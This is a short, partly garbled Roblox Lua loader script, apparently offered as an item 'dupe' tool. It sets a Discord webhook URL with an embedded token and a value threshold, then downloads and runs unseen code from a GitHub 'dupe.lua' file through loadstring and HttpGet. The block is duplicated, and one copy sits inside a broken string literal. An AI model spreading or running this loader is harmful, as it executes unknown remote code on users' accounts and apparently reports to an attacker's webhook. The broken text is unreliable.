local Webhook = "local Webhook = "https://discord.com/api/webhooks/1437256527202222231/82U4oaYdaWdqSJS_QS9-OGhU77TcGcLETYNg7JbnUABnoeJbdQUCHERWBGFygfTNvDxG"

getgenv().UserPingThreshold = 50000000

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))() "

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))() 
